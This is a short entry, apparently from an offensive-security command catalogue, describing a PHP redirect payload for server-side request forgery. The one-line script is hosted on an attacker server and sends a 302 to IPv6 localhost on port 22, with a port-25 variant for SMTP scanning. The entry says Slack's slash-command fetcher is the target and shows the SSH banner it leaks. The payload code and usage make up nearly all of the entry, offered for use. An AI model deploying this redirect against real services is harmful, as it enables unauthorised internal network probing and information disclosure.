---
id: cmd-php-redirect-ipv6
data: '<?php header("Location: http://[::]:22/"); ?>'
tags:
  - ssrf
  - redirect
  - php
  - ipv6
type: command
output: null
executor: php
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:14.454Z'
verified: false
validated: true
submitted: true
---
# php-redirect-ipv6-internal

## Command

```php
<?php header("Location: http://[::]:22/"); ?>
```

## Description

This PHP script, hosted as index.php on an attacker-controlled server, issues an HTTP 302 redirect to an internal IPv6 localhost address on port 22 (SSH). When fetched by Slack's server via a slash command, it triggers SSRF to access and disclose the internal service banner.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `Location` | Target URL for redirect (e.g., http://[::]:22/ for SSH, http://[::]:25/ for SMTP) | Yes |

## Examples

### Basic Usage

```php
<?php header("Location: http://[::]:22/"); ?>
```

Save as index.php and host on public server.

### Advanced Usage

```php
<?php header("Location: http://[::]:25/"); ?>
```

Modify port for SMTP scanning.

## Expected Output

When requested (e.g., via curl https://attacker.com/index.php), returns HTTP 302 with Location: http://[::]:22/. When triggered by Slack, the follow-up response includes the SSH banner like "SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.2".

## Related

- [[Related Procedure: Configure-Slash-Command-SSRF]]
- [[Related Procedure: Observe-SSRF-Results]]
